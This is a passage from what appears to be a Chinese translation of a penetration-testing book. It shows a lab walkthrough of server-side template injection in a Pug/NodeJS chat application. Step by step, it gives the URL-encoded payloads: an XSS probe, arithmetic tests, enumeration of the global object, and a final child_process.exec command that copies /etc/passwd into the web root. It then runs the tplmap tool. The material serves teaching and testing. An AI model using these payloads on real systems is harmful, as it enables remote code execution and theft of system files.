-   [https://blog.websecurify.com/2017/02/hacking-node-serialize.html](https://blog.websecurify.com/2017/02/hacking-node-serialize.html){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
### 模板引擎攻击------模板注入 {#3_the_throw_web_application_exploitation.html#模板引擎攻击——模板注入 .calibre15}
模板引擎由于其模块化和简洁的代码与标准 HTML
相比而被更频繁地使用。模板注入是指用户输入直接传递到渲染模板，允许修改底层模板。这可以在
wiki，WSYWIG
或电子邮件模板中恶意使用。这种情况很少发生在无意中，所以它经常被误解为只是
XSS。模板注入通常允许攻击者访问底层操作系统以获取远程代码执行。
在下一个示例中，你将通过 Pug 对我们的 NodeJS
应用程序执行模板注入攻击。我们无意中将自己暴露给模板注入，使用带有用户输入的元重定向，使用模板文字`${}`{.calibre14
.pcalibre4 .pcalibre3}直接在 Pug
中呈现。重要的是要注意模板文字允许使用换行符，这是我们必须破坏段落标记，因为
Pug 是空格和换行符，类似于 Python 。
在 Pug 中，第一个字符或单词表示表示标签或功能的 Pug
关键字。你也可以使用缩进指定多行字符串，如下所示：
-   p\.
    -   这是段落缩进。
    -   这仍然是段落标记的一部分。
以下是 HTML 和 Pug 模板的示例：
![](3-24.png){.calibre11}
上面的示例文本显示了它在 HTML 中的外观以及相应的 Pug Markup
语言的外观。通过模板和字符串插值，我们可以创建快速，可重用且高效的模板
**模板注入示例**
聊天应用程序容易受到模板注入攻击。在下面的应用程序中，我们将看看我们是否可以与
Pug
模板系统进行交互。这通常可以通过检查我们提供的输入参数是否可以处理基本操作来完成。James
Kettle 写了一篇关于攻击模板和与底层模板系统交互的大论文（
[http://ubm.io/2ECTYSi](http://ubm.io/2ECTYSi){.pcalibre2 .calibre9
.pcalibre .pcalibre1 target="_blank"} ）。
与 Pug 交互：
-   转到 [http://chat:3000](http://chat:3000){.pcalibre2 .calibre9
    .pcalibre .pcalibre1 target="_blank"} 并使用任何有效帐户登录
-   转到
    [http://chat:3000/directmessage](http://chat:3000/directmessage){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
    并输入用户和评论以及"发送"，接下来，返回 Direct Message 页面并尝试将
    XSS payload 输入到用户参数``{.calibre14
    .pcalibre4 .pcalibre3}
    -   [http://chat:3000/ti?user=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&comment](http://chat:3000/ti?user=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&comment){.pcalibre2
        .calibre9 .pcalibre .pcalibre1 target="_blank"}
    -   这表明应用程序容易受到 XSS
        的攻击，但我们可以与模板系统进行交互吗？
-   在 Burp 历史记录中，查看服务器请 request/response 的响应
    `/ti?user=`{.calibre14 .pcalibre4 .pcalibre3}，并将请求发送到 Burp
    Repeater（ctrl+r）
![](3-25.png){.calibre11}
![](3-26.png){.calibre11}
**测试基本操作**
我们可以通过将它传递给算术字符串来测试模板注入的 XSS
易受攻击参数。如果我们的输入被读取，它将识别它易受模板注入的影响。这是因为模板（如编码语言）可以轻松支持评估算术运算符。
测试基本操作符：
-   在 Burp Repeater 中，测试 `/ti`{.calibre14 .pcalibre4 .pcalibre3}
    上的每个参数以进行模板注入。我们可以通过传递9乘9这样的数学运算来做到这一点。
-   我们可以看到它没有用，我们没有得到81，请记住，我们的用户输入包含在段落标记内，所以我们可以假设我们的
    Pug 模板代码看起来像这样：
    -   p Message has been sent to !{user}
![](3-27.png){.calibre11}
利用 Pug 的特点：
-   正如我们之前所说，Pug 是空格分隔的（类似于
    Python），换行符开始一个新的模板输入，这意味着如果我们可以突破 Pug
    中的当前行，我们可以执行新的模板代码。在这种情况下，我们将打破段落标记
    ``{.calibre14 .pcalibre4 .pcalibre3}
    ，如上所示，并执行新的恶意模板代码。为此，我们将不得不使用一些 URL
    编码来利用此漏洞（
    [http://bit.ly/2qxeDiy](http://bit.ly/2qxeDiy){.pcalibre2 .calibre9
    .pcalibre .pcalibre1 target="_blank"} ）。
-   让我们逐步完成每个要求以执行模板注入：
    -   首先，我们需要触发一个新行并突破当前模板。这可以使用以下字符完成：
        -   %0a new line
    -   其次，我们可以通过使用"="符号来利用 Pug 中的算术函数
        -   %3d%编码"="符号
    -   最后，我们可以输入我们的数学方程式
        -   9\*9数学方程式
-   因此，最终 payload 将如下所示：
    -   \[newline\]=9\*9
    -   URL 编码：
        -   `GET /ti?user=%0a%3d9*9&comment=&link=`{.calibre14
            .pcalibre4 .pcalibre3}
-   `GET /ti?user=%0a%3d9*9`{.calibre14 .pcalibre4
    .pcalibre3}在响应正文中给出了81。你已在用户参数中发现了模板注入！让我们通过利用
    JavaScript 来获取远程代码。
![](3-28.png){.calibre11}
正如你在响应中所看到的，我们在段落标记之外有"81"而不是用户名！这意味着我们能够注入模板。
我们现在知道我们可以进行模板注入，因为我们可以执行简单的计算，但是我们需要看看是否可以执行
shell。要获得 shell 执行，我们必须找到正确的函数来在 Node/JavaScript
中执行。
-   首先，我们将识别自身全局对象的根节点，然后继续确定我们可以访问哪些模块和功能。我们希望最终使用
    Require 函数导入 `child_process.exec`{.calibre14 .pcalibre4
    .pcalibre3} 以运行操作系统命令。在 Pug 中，"="字符允许我们输出
    JavaScript 结果。我们将从访问全局根开始：
    -   \[new line\]=global
    -   使用 Burp 的解码器工具将上述表达式编码为 URL
        编码，可以得到：%0a%3d%20%67%6c%6f%62%61%6c
-   使用上面的 URL 编码字符串作为用户值并重新发送。
-   如果在提交前后请求一切顺利，我们将看到 \[object
    global\]，这意味着我们可以访问全局对象。
![](3-29.png){.calibre11}
解析全局对象：
-   让我们通过在全局范围内使用 Pug
    迭代器'each'来查看我们可以访问的对象和属性。记住换行符（%0a）和空格（%20）：
    -   each val,index in global p=index
    -   URL 编码： %0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%2
-   在上面的例子中，我们使用'each'迭代器，它可以访问一个值，并且如果我们指定了数组或对象，也可以选择访问索引。我们试图找到我们在全局对象中可以访问的对象，方法或模块。我们的最终目标是找到类似"require"方法的东西，以允许我们导入
    child_process.exec，它允许我们运行系统命令。从现在开始，我们只是使用反复试验来识别最终会给我们
    require 方法的方法或对象。
    ![](3-30.png){.calibre11}
查找代码执行功能：
-   从上一个请求中，我们看到了全局中的所有对象以及一个名为"process"的对象。接下来，我们需要识别我们在
    global.process 中可以访问的有趣对象：
    -   each val,index in global.process p=index
    -   URL 编码： %0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%7
-   我们从所有可用的方法中选择"process"，因为我们知道它最终会导致'require'。你可以通过选择不同的迭代方法来尝试尝试和错误过程：
    -   each val,index in global.process.mainModule p = index
-   URL 编码： %0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%2
    ![](3-31.png){.calibre11}
远程执行代码：
-   发送此最终 payload ，我们应该在 global.process.mainModule
    中看到"require"函数。我们现在可以将其设置为使用.exec
    导入'child_process'以获取 RCE：
    -   -   var x = global.process.mainModule.require
    -   -   x(\'child_process\').exec(\'cat / etc / passwd
            \>\>/opt/web/chatSupportSystems/public/accounts.txt\')
    -   URL 编码： %0a%2d%20%76%61%72%20%78%20%3d%20%67%6c%6f%6
-   在上面的例子中，我们像在 JavaScript
    中一样定义变量"x"，但行开头的破折号表示无缓冲输出（隐藏）。我们正在使用全局对象和我们最终需要的模块'require'，这允许我们使用'child_process'.exec
    来运行系统命令。
-   我们将 /etc/passwd 的内容输出到 Web
    公共根目录，这是我们唯一具有写入权限的目录（由应用程序创建者设计），允许用户查看内容。我们也可以使用系统命令执行反向shell或其他任何允许的操作。
-   我们可以看到
    [http://chat:3000/accounts.txt](http://chat:3000/accounts.txt){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"} 将包含的内容
-   来自 Web 服务器的 /etc/passwd。
-   使用此命令在系统上执行完整的 RCE 并返回 shell。
    ![](3-32.png){.calibre11}
现在，我们可以对这一系列操作实现自动化吗？当然可以。有一个类似 SQLmap
的名为 [Tplmap](https://github.com/epinna/tplmap){.pcalibre2 .calibre9
.pcalibre .pcalibre1 target="_blank"}
的工具，它可以尝试模板注入的所有不同组合：
-   cd /opt/tplmap
-   ./tplmap.py -u
    \"[http://chat:3000/ti?user=\*&comment=asdfasdf&link=](http://chat:3000/ti?user=*&comment=asdfasdf&link=){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}\"